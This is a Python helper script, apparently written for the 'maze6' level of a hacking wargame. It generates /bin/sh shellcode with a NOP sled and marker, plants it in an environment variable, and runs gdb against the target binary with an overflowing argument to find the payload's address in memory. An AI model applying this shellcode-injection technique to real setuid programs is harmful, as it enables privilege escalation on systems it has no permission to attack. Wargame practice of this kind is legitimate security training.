#!/usr/bin/env python3
"""
Find SC address within maze6 process using gdb.
"""
import os, sys, subprocess
from pwn import *

context.arch = 'i386'
context.os = 'linux'

# Generate shellcode
sc_source = shellcraft.sh()
sc = asm(sc_source)
if isinstance(sc, str):
    sc = sc.encode('latin-1')

nop_sled = b'\x90' * 4096
sc_value = nop_sled + sc

# Create a marker at the beginning of the NOP sled to find in memory
marker = b'ABCDEFGH'  # Will be at start of SC value
sc_value_with_marker = marker + sc_value

print(f"Shellcode length: {len(sc)} bytes")
print(f"SC value length: {len(sc_value_with_marker)} bytes")
print(f"Shellcode hex (first 32): {sc[:32].hex()}")

# Write a gdb script
gdb_commands = """
set environment SC = {sc_value}
break *main+73
run /dev/null AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# At this point we're after strcpy, before memfrob
# Find SC in the environment
print "Finding SC address..."
# The environment is pointed to by __environ
# Let's look at the stack for environment pointers
info proc mappings
# Directly search for our marker in memory
find /b 0xffff0000, 0xffffffff, {marker_hex}
# Also print stack pointer
print $esp
print $ebp
# Look at environment
set $env = (char***)environ
if $env != 0
  set $i = 0
  while $env[0][$i] != 0
    printf "env[%d] = %s\\n", $i, $env[0][$i]
    set $i = $i + 1
  end
end
quit
""".format(
    sc_value=sc_value_with_marker.decode('latin-1'),
    marker_hex=''.join(f'{b:02x}' for b in marker)
)

with open('/tmp/gdb_script', 'w') as f:
    f.write(gdb_commands)

print("\nRunning gdb to find SC address...")
result = subprocess.run(
    ['gdb', '-batch', '-x', '/tmp/gdb_script', '/maze/maze6'],
    capture_output=True, text=True, cwd='/tmp'
)
print("GDB stdout:")
print(result.stdout)
print("GDB stderr:")
print(result.stderr)

# Parse output to find the address
for line in result.stdout.split('\n'):
    if '0xffff' in line and marker.hex()[:8] in line.replace(' ', '').lower():
        print(f"Found possible SC address in line: {line}")
    print(f"LINE: {line}")
